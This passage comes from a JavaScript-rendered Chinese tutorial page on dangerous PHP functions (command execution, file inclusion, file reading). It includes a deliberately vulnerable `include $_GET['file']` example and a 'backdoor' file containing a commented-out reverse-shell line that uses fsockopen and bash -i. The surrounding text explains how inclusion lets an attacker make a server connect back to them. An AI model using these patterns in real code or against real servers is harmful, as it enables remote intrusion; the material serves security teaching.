&$return_var] ) : void\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-11",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"command\uff1a\u8981\u6267\u884c\u7684\u547d\u4ee4"}),"\n",(0,r.jsx)(n.li,{children:"return_var\uff1aUnix\u547d\u4ee4\u7684\u8fd4\u56de\u72b6\u6001\u5c06\u88ab\u8bb0\u5f55\u5230\u6b64\u51fd\u6570\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"\u7b2c\u4e00\u4f60\u53ef\u4ee5\u8fd9\u4e48\u5199\n<?php\n    passthru('whoami');\t//\u76f4\u63a5\u5c06\u7ed3\u679c\u8fd4\u56de\u5230\u9875\u9762\n?>\n\u7b2c\u4e8c\u4f60\u53ef\u4ee5\u8fd9\u4e48\u5199\n<?php\n    passthru('whoami',$result);\t//\u5c06\u7ed3\u679c\u8fd4\u56de\u5230\u4e00\u4e2a\u53d8\u91cf\uff0c\u7136\u540e\u901a\u8fc7\u8f93\u51fa\u53d8\u91cf\u503c\u5f97\u5230\u8f93\u51fa\u5185\u5bb9\n    echo $result;\n?>\n"})}),"\n",(0,r.jsx)(n.h4,{id:"pcntl_exec",children:"pcntl_exec()"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u5f53\u524d\u8fdb\u7a0b\u7a7a\u95f4\u6267\u884c\u6307\u5b9a\u7a0b\u5e8f\u3002\u5173\u952e\u70b9\u5c31\u5728\u4e8e\u8fdb\u7a0b\u7a7a\u95f4\uff0c\u5018\u82e5\u6211\u73b0\u5728\u8bbe\u5b9a\u4e00\u4e2a\u6761\u4ef6\uff0c\u4f60\u53ea\u6709\u5728\u67d0\u4e2a\u5b50\u8fdb\u7a0b\u4e2d\u624d\u80fd\u8bfb\u53d6phpinfo\uff0c\u90a3\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u9700\u8981\u7528\u5230\u8fd9\u4e2a\u51fd\u6570\u4e86\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"pcntl_exec( string $path[, array $args[, array $envs]] ) : void\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-12",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"path\uff1apath\u5fc5\u987b\u65f6\u53ef\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u8def\u5f84\u6216\u5728\u4e00\u4e2a\u6587\u4ef6\u7b2c\u4e00\u884c\u6307\u5b9a\u4e86\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\u6807\u5934\u7684\u811a\u672c(\u6bd4\u5982\u6587\u4ef6\u7b2c\u4e00\u884c\u662f#!/usr/local/bin/perl\u7684perl\u811a\u672c)"}),"\n",(0,r.jsx)(n.li,{children:"args\uff1a\u6b64\u53c2\u6570\u662f\u4e00\u4e2a\u4f20\u9012\u7ed9\u7a0b\u5e8f\u7684\u53c2\u6570\u7684\u5b57\u7b26\u4e32\u6570\u7ec4"}),"\n",(0,r.jsx)(n.li,{children:"envs\uff1a\u73af\u5883\u53d8\u91cf\uff0c\u8fd9\u4e2a\u60f3\u5fc5\u5927\u5bb6\u90fd\u5f88\u719f\u6089\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u91cc\u5f3a\u8c03\u4e00\u70b9\uff0c\u8fd9\u91cc\u4f20\u5165\u7684\u662f\u6570\u7ec4\uff0c\u6570\u7ec4\u683c\u5f0f\u662f key => value\u683c\u5f0f\u7684\uff0ckey\u4ee3\u8868\u8981\u4f20\u9012\u7684\u73af\u5883\u53d8\u91cf\u7684\u540d\u79f0\uff0cvalue\u4ee3\u8868\u8be5\u73af\u5883\u53d8\u91cf\u503c\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u793a\u4f8b\u4ee3\u7801\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"//father\n<?php\n\tpcntl_exec('/usr/local/bin/php', ['2.php']);\n?>\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"//son\n<?php\n    while(true){\n        echo 'ok';\n    }\n?>\n"})}),"\n",(0,r.jsx)(n.h4,{id:"popen",children:"popen()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u4f7f\u7528command\u53c2\u6570\u6253\u5f00\u8fdb\u7a0b\u6587\u4ef6\u6307\u9488\u3002\u5982\u679c\u51fa\u9519\uff0c\u90a3\u4e48\u8be5\u51fd\u6570\u5c31\u4f1a\u8fd4\u56deFALSE\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"popen(command,mode)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-13",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"command\uff1a\u8981\u6267\u884c\u7684\u547d\u4ee4"}),"\n",(0,r.jsxs)(n.li,{children:["mode\uff1a\u5fc5\u9700\u3002\u89c4\u5b9a\u8fde\u63a5\u7684\u6a21\u5f0f","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"r\uff1a\u53ea\u8bfb"}),"\n",(0,r.jsx)(n.li,{children:"w\uff1a\u53ea\u5199\uff08\u6253\u5f00\u5e76\u6e05\u7a7a\u5df2\u6709\u6587\u4ef6\u6216\u521b\u5efa\u4e00\u4e2a\u65b0\u6587\u4ef6\uff09"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\t$file = popen("demo.txt","r");\n\tpclose($file);\n?>\n\n<?php\n$file = popen("/bin/ls","r");\n//some code to be executed\npclose($file);\n?>\n'})}),"\n",(0,r.jsx)(n.h4,{id:"proc_open",children:"proc_open()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\uff0c\u5e76\u4e14\u6253\u5f00\u7528\u6765\u8f93\u5165\u6216\u8005\u8f93\u51fa\u7684\u6587\u4ef6\u6307\u9488"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"proc_open( string $cmd, array $descriptorspec, array &$pipes[, string $cwd = NULL[, array $env = NULL[, array $other_options = NULL]]] ) \n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6b64\u51fd\u6570\u5176\u5b9e\u548c",(0,r.jsx)(n.code,{children:"popen"}),"\u51fd\u6570\u7c7b\u4f3c\uff0c\u90fd\u662f\u6267\u884c\u547d\u4ee4"]}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-14",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"cmd\uff1a\u8981\u6267\u884c\u7684\u547d\u4ee4"}),"\n",(0,r.jsx)(n.li,{children:"descriptorspec\uff1a\u7d22\u5f15\u6570\u7ec4\u3002\u6570\u7ec4\u4e2d\u7684\u952e\u503c\u8868\u793a\u63cf\u8ff0\u7b26\uff0c\u5143\u7d20\u503c\u8868\u793a PHP \u5982\u4f55\u5c06\u8fd9\u4e9b\u63cf\u8ff0\u7b26\u4f20\u9001\u81f3\u5b50\u8fdb\u7a0b\u30020 \u8868\u793a\u6807\u51c6\u8f93\u5165\uff08stdin\uff09\uff0c1 \u8868\u793a\u6807\u51c6\u8f93\u51fa\uff08stdout\uff09\uff0c2 \u8868\u793a\u6807\u51c6\u9519\u8bef\uff08stderr\uff09\u3002"}),"\n",(0,r.jsx)(n.li,{children:"pipes\uff1a\u5c06\u88ab\u7f6e\u4e3a\u7d22\u5f15\u6570\u7ec4\uff0c\u5176\u4e2d\u7684\u5143\u7d20\u662f\u88ab\u6267\u884c\u7a0b\u5e8f\u521b\u5efa\u7684\u7ba1\u9053\u5bf9\u5e94\u5230PHP\u8fd9\u4e00\u6bb5\u7684\u6587\u4ef6\u6307\u9488\u3002"}),"\n",(0,r.jsx)(n.li,{children:"cwd\uff1a\u8981\u6267\u884c\u547d\u4ee4\u7684\u521d\u59cb\u5de5\u4f5c\u76ee\u5f55\u3002\u5fc5\u9700\u662f\u7edd\u5bf9\u8def\u5f84\u3002\u6b64\u53c2\u6570\u9ed8\u8ba4\u4f7f\u7528 NULL\uff08\u8868\u793a\u5f53\u524d PHP \u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\uff09"}),"\n",(0,r.jsx)(n.li,{children:"env\u3002\u8981\u6267\u884c\u547d\u4ee4\u6240\u4f7f\u7528\u7684\u73af\u5883\u53d8\u91cf\u3002\u6b64\u53c2\u6570\u9ed8\u8ba4\u4e3a NULL\uff08\u8868\u793a\u548c\u5f53\u524d PHP \u8fdb\u7a0b\u76f8\u540c\u7684\u73af\u5883\u53d8\u91cf\uff09"}),"\n",(0,r.jsxs)(n.li,{children:["other_options\uff1a\u53ef\u9009\u3002\u9644\u52a0\u9009\u9879","\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"suppress_errors \uff08\u4ec5\u7528\u4e8e Windows \u5e73\u53f0\uff09\uff1a\u8bbe\u7f6e\u4e3a TRUE \u8868\u793a\u6291\u5236\u672c\u51fd\u6570\u4ea7\u751f\u7684\u9519\u8bef\u3002"}),"\n",(0,r.jsx)(n.li,{children:"bypass_shell \uff08\u4ec5\u7528\u4e8e Windows \u5e73\u53f0\uff09\uff1a\u8bbe\u7f6e\u4e3a TRUE \u8868\u793a\u7ed5\u8fc7 cmd.exe shell\u3002"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u8bf4\u767d\u4e86\uff0c\u5176\u5b9e\u5c31\u662f\u6267\u884c\u547d\u4ee4\uff0c\u53ea\u4e0d\u8fc7\u5176\u4e2d\u591a\u4e86\u4e00\u4e9b\u9009\u9879\uff0c\u5305\u62ec\u76ee\u5f55\u7684\uff0c\u73af\u5883\u53d8\u91cf\u7684\u7b49\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u793a\u4f8b\u4ee3\u7801\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'$descriptorspec = array(\n\t\t\t0 => array("pipe", "r"),\t//\u6807\u51c6\u8f93\u5165\uff0c\u5b50\u8fdb\u7a0b\u4ece\u6b64\u7ba1\u9053\u8bfb\u53d6\u6570\u636e\n\t\t\t1 => array("pipe", "w"),\t//\u6807\u51c6\u8f93\u51fa\uff0c\u5b50\u8fdb\u7a0b\u5411\u6b64\u7ba1\u9053\u5199\u5165\u6570\u636e\n\t\t\t2 => array("file", "/opt/figli/php/error-output.txt","a")\t//\u6807\u51c6\u9519\u8bef\uff0c\u5199\u5165\u5230\u6307\u5b9a\u6587\u4ef6\n\t\t\t);\n \n \n\t$process = proc_open("ls -a", $descriptorspec, $pipes);\n \n\tif(is_resource($process)){\n \n\t\techo stream_get_contents($pipes[1]);\n\t\tfclose($pipes[1]);\n \n\t\tproc_close($process);\t//\u5728\u8c03\u7528proc_close\u4e4b\u524d\u5fc5\u987b\u5173\u95ed\u6240\u6709\u7ba1\u9053\n\t}\n'})}),"\n",(0,r.jsx)(n.h3,{id:"\u6587\u4ef6\u5305\u542b",children:"\u6587\u4ef6\u5305\u542b"}),"\n",(0,r.jsx)(n.h4,{id:"include",children:"include()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"include"}),"\u5c06\u4f1a\u5305\u542b\u8bed\u53e5\u5e76\u6267\u884c\u6307\u5b9a\u6587\u4ef6"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"include 'filename';\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5173\u952e\u70b9\u5c31\u5728\u4e8e\u6267\u884c\u6307\u5b9a\u6587\u4ef6\uff0c\u6267\u884c\u7ed9\u4e86\u6211\u4eec\u4ee3\u7801\u6267\u884c\u7684\u673a\u4f1a\u3002\u5018\u82e5\u6b64\u65f6\u6211\u4eec\u6784\u9020\u4e86\u4e00\u4e2a\u540e\u95e8\u6587\u4ef6\uff0c\u9700\u8981\u5728\u76ee\u6807\u673a\u5668\u6267\u884c\u8fdb\u884cshell\u53cd\u5f39\uff0c\u90a3\u4e48\u5982\u679c\u4ee3\u7801\u4e2d\u6709",(0,r.jsx)(n.code,{children:"include"}),"\u800c\u4e14\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4f7f\u7528\u8be5\u51fd\u6570\u6765\u6267\u884c\u6211\u4eec\u7684\u540e\u95e8\u51fd\u6570\u3002\u4e0b\u9762\u6211\u6765\u6f14\u793a\u4e00\u4e0b\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u793a\u4f8b\u4ee3\u7801(1.php)\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\thighlight_file(__FILE__);\n\t$file = $_GET['file'];\n\tinclude $file;\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u793a\u4f8b\u4ee3\u7801(2.php)\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\t//\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528PHP\u6765\u53cd\u5f39shell\uff0c\u6211\u8fd9\u91cc\u53ea\u662f\u6f14\u793a\n\t//$sock=fsockopen("127.0.0.1",4444);exec("bin/bash -i <&3 >&3 2>&3");\n\techo \'<br><h1>[*]backdoor is running!</h1>\';\n?>\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648346.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"include_once",children:"include_once()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"include_once"}),"\u4e0e",(0,r.jsx)(n.code,{children:"include"}),"\u6ca1\u6709\u592a\u5927\u533a\u522b\uff0c\u552f\u4e00\u7684\u5176\u533a\u522b\u5df2\u7ecf\u5728\u540d\u79f0\u4e2d\u4f53\u73b0\u4e86\uff0c\u5c31\u662f\u76f8\u540c\u7684\u6587\u4ef6\u53ea\u5305\u542b\u4e00\u6b21\u3002\u5176\u4ed6\u529f\u80fd\u548c",(0,r.jsx)(n.code,{children:"include_once"}),"\u4e00\u6837\uff0c\u53ea\u662f\u589e\u52a0\u5bf9\u6bcf\u4e2a\u6587\u4ef6\u5305\u542b\u7684\u6b21\u6570\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"require",children:"require()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"require"}),"\u7684\u5b9e\u73b0\u548c",(0,r.jsx)(n.code,{children:"include"}),"\u529f\u80fd\u51e0\u4e4e\u5b8c\u5168\u76f8\u540c\uff0c\u90a3\u65e2\u7136\u4e00\u6837\u4e3a\u4ec0\u4e48\u8fd8\u8981\u591a\u4e00\u4e2a\u8fd9\u6837\u7684\u51fd\u6570\u5462\uff1f( \u6211\u4e5f\u4e0d\u77e5\u9053)"]}),"\n",(0,r.jsx)(n.p,{children:"\u5176\u5b9e\u4e24\u8005\u8fd8\u662f\u6709\u70b9\u533a\u522b\u7684\uff0c\u4ec0\u4e48\u533a\u522b\u5462\uff1f\u8fd9\u4e48\u8bf4\uff0c\u5982\u679c\u4f60\u5305\u542b\u7684\u6587\u4ef6\u7684\u4ee3\u7801\u91cc\u9762\u6709\u9519\u8bef\uff0c\u4f60\u89c9\u5f97\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u662f\u7ee7\u7eed\u6267\u884c\u5305\u542b\u7684\u6587\u4ef6\uff0c\u8fd8\u662f\u505c\u6b62\u6267\u884c\u5462\uff1f\u6240\u4ee5\u533a\u522b\u5c31\u5728\u8fd9\u91cc\u4ea7\u751f\u4e86\u3002"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"require"}),"\u5728\u51fa\u9519\u65f6\u4f1a\u5bfc\u81f4\u811a\u672c\u7ec8\u6b62\uff0c\u800c",(0,r.jsx)(n.code,{children:"include"}),"\u5728\u51fa\u9519\u65f6\u53ea\u662f\u53d1\u751f\u8b66\u544a\uff0c\u811a\u672c\u8fd8\u662f\u7ee7\u7eed\u6267\u884c\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"require_once",children:"require_once()"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u4e2a\u6211\u89c9\u5f97\u4f60\u770b\u5b8c\u4e0a\u9762\u7684\uff0c\u5e94\u8be5\u5c31\u61c2\u4e86\u3002\u8fd9\u4e24\u8005\u5173\u7cfb\u548c",(0,r.jsx)(n.code,{children:"include"}),"\u4e0e",(0,r.jsx)(n.code,{children:"include_once"}),"\u7684\u5173\u7cfb\u662f\u4e00\u6837\u7684\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"\u603b\u7ed3-1",children:"\u603b\u7ed3"}),"\n",(0,r.jsx)(n.p,{children:"\u6587\u4ef6\u5305\u542b\u6709\u5f88\u591a\u5229\u7528\u624b\u6bb5\uff0c\u5176\u4e2d\u5728\u5b9e\u9645\u73af\u5883\u4e2d\uff0c\u4f8b\u5982\u6211\u4eec\u5411\u670d\u52a1\u5668\u5199\u5165\u4e86\u540e\u95e8\uff0c\u4f46\u662f\u6211\u4eec\u65e0\u6cd5\u76f4\u63a5\u8fde\u63a5\u670d\u52a1\u5668\uff0c\u90a3\u4e48\u5982\u679c\u6709\u6587\u4ef6\u5305\u542b\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5305\u542b\u51fd\u6570\u5305\u542b\u6267\u884c\u6211\u4eec\u7684\u540e\u95e8\u51fd\u6570\uff0c\u8ba9\u670d\u52a1\u5668\u53cd\u5f39\u8fde\u63a5\u6211\u4eec\u3002\u5c82\u4e0d\u7f8e\u54c9\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u6587\u4ef6\u8bfb\u53d6\u4e0b\u8f7d",children:"\u6587\u4ef6\u8bfb\u53d6(\u4e0b\u8f7d)"}),"\n",(0,r.jsx)(n.h4,{id:"file_get_contents",children:"file_get_contents()"}),"\n",(0,r.jsx)(n.p,{children:"\u51fd\u6570\u529f\u80fd\u662f\u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"file_get_contents(path,include_path,context,start,max_length)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-15",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"filename\uff1a\u8981\u8bfb\u53d6\u6587\u4ef6\u7684\u540d\u79f0\u3002"}),"\n",(0,r.jsx)(n.li,{children:"include_path\uff1a\u53ef\u9009\u3002\u5982\u679c\u4e5f\u60f3\u5728 include_path \u4e2d\u641c\u7d22\u6587\u4ef6\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a1\u3002"}),"\n",(0,r.jsx)(n.li,{children:"context\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u53e5\u67c4\u7684\u4f4d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.li,{children:"start\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u6587\u4ef6\u4e2d\u5f00\u59cb\u8bfb\u53d6\u7684\u4f4d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.li,{children:"max_length\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    echo file_get_contents('demo.txt');\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nI am a demo text\n"})}),"\n",(0,r.jsx)(n.h4,{id:"fopen",children:"fopen()"}),"\n",(0,r.jsxs)(n.p,{children:["\u6b64\u51fd\u6570\u5c06\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u6216URL\uff0c\u5982\u679c fopen() \u5931\u8d25\uff0c\u5b83\u5c06\u8fd4\u56de FALSE \u5e76\u9644\u5e26\u9519\u8bef\u4fe1\u606f\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728\u51fd\u6570\u540d\u524d\u9762\u6dfb\u52a0\u4e00\u4e2a ",(0,r.jsx)(n.code,{children:"@"})," \u6765\u9690\u85cf\u9519\u8bef\u8f93\u51fa\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"fopen(filename,mode,include_path,context)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-16",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"filename\uff1a\u5fc5\u9700\u3002\u8981\u6253\u5f00\u7684\u6587\u4ef6\u6216URL"}),"\n",(0,r.jsx)(n.li,{children:"mode\uff1a\u5fc5\u9700\u3002\u89c4\u5b9a\u8bbf\u95ee\u7c7b\u578b\uff08\u4f8b\u5982\u53ea\u8bfb\uff0c\u53ea\u5199\uff0c\u8bfb\u5199\u65b9\u5f0f\u7b49\uff0c\u65b9\u5f0f\u7684\u89c4\u5b9a\u548c\u5176\u4ed6\u8bed\u8a00\u7684\u89c4\u5b9a\u65b9\u5f0f\u4e00\u81f4\uff09"}),"\n",(0,r.jsx)(n.li,{children:"include_path\uff1a\u53ef\u9009\u3002\u5c31\u662f\u4f60\u53ef\u4ee5\u6307\u5b9a\u641c\u7d22\u7684\u8def\u5f84\u4f4d\u7f6e\uff0c\u5982\u679c\u8981\u6307\u5b9a\u7684\u8bdd\uff0c\u90a3\u4e48\u8be5\u53c2\u6570\u8981\u6307\u5b9a\u4e3a- context\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u53e5\u67c4\u7684\u73af\u5883\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\t$file = fopen("demo.txt","rb");\n\t$content = fread($file,1024);\n\techo $content;\n\tfclose($file);\n?>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nI am a demo text\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u5176\u5b9e\u4e5f\u5305\u542b\u4e86",(0,r.jsx)(n.code,{children:"fread"}),"\u7684\u7528\u6cd5\u3002\u56e0\u4e3a",(0,r.jsx)(n.code,{children:"fread"}),"\u4ec5\u4ec5\u53ea\u662f\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u8981\u60f3\u8bfb\u53d6\u8fd8\u5f97\u9700\u8981\u7528\u5230",(0,r.jsx)(n.code,{children:"fread"}),"\u6765\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"fread",children:"fread()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u51fd\u6570\u521a\u624d\u5728\u4e0a\u4e2a\u51fd\u6570\u4e2d\u57fa\u672c\u5df2\u7ecf\u6f14\u793a\u8fc7\u4e86\uff0c\u5c31\u662f\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002\u8fd9\u91cc\u4ee3\u7801\u5c31\u4e0d\u518d\u6f14\u793a\u4e86\uff0c\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u53c2\u6570\u548c\u7528\u6cd5\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"string fread ( resource $handle , int $length )\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-17",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:["handle\uff1a\u6587\u4ef6\u7cfb\u7edf\u6307\u9488\uff0c\u662f\u5178\u578b\u5730\u7531 ",(0,r.jsx)(n.code,{children:"fopen"}),"\u521b\u5efa\u7684",(0,r.jsx)(n.code,{children:"resource"}),"\u3002"]}),"\n",(0,r.jsx)(n.li,{children:"length\uff1a\u5fc5\u9700\u3002\u4f60\u8981\u8bfb\u53d6\u7684\u6700\u5927\u5b57\u8282\u6570\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.h4,{id:"fgets",children:"fgets()"}),"\n",(0,r.jsx)(n.p,{children:"\u4ece\u6253\u5f00\u7684\u6587\u4ef6\u4e2d\u8bfb\u53d6\u4e00\u884c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"fgets(file,length) \n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-18",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"file\uff1a\u5fc5\u9700\u3002\u89c4\u5b9a\u8981\u8bfb\u53d6\u7684\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.li,{children:"length\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u8981\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002\u9ed8\u8ba4\u662f1024\u5b57\u8282\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u51fa\u8fd9\u4e2a\u51fd\u6570\u548c\u4e4b\u524d\u7684fread\u533a\u522b\u4e0d\u662f\u5f88\u5927\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e2a\u8bfb\u53d6\u7684\u662f\u4e00\u884c\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"fgetss",children:"fgetss()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u51fd\u6570\u8ddf\u4e0a\u4e2a\u6ca1\u4ec0\u4e48\u5dee\u522b\uff0c\u4e5f\u662f\u4ece\u6253\u5f00\u7684\u6587\u4ef6\u4e2d\u8bfb\u53d6\u53bb\u4e00\u884c\uff0c\u53ea\u4e0d\u8fc7\u8fc7\u6ee4\u6389\u4e86 HTML \u548c PHP \u6807\u7b7e\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"fgetss(file,length,tags)\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-19",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"file\uff1a\u5fc5\u9700\u3002\u8981\u68c0\u67e5\u7684\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.li,{children:"length\uff1a\u53ef\u9009\u3002\u89c4\u5b9a\u8981\u8bfb\u53d6\u7684\u5b57\u8282\u6570\uff0c\u9ed8\u8ba41024\u5b57\u8282\u3002"}),"\n",(0,r.jsx)(n.li,{children:"tags\uff1a\u53ef\u9009\u3002\u54ea\u4e9b\u6807\u8bb0\u4e0d\u53bb\u6389\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n\t$file = fopen("demo.html","r");\n\techo fgetss($file);\n\tfclose($file);\n?>\n\ndemo.html\u4ee3\u7801\n<h1>I am a demo</h1>\n    \n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nI am a demo\n'})}),"\n",(0,r.jsx)(n.h4,{id:"readfile",children:"readfile()"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u4e2a\u51fd\u6570\u4ece\u540d\u79f0\u57fa\u672c\u5c31\u77e5\u9053\u5b83\u662f\u5e72\u5565\u7684\u4e86\uff0c\u8bfb\u6587\u4ef6\u7528\u7684\u3002\u6b64\u51fd\u6570\u5c06\u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\uff0c\u5e76\u5199\u5165\u5230\u8f93\u51fa\u7f13\u51b2\u4e2d\u3002\u5982\u679c\u6210\u529f\uff0c\u8be5\u51fd\u6570\u8fd4\u56de\u4ece\u6587\u4ef6\u4e2d\u8bfb\u5165\u7684\u5b57\u8282\u6570\u3002\u5982\u679c\u5931\u8d25\uff0c\u8be5\u51fd\u6570\u8fd4\u56de FALSE 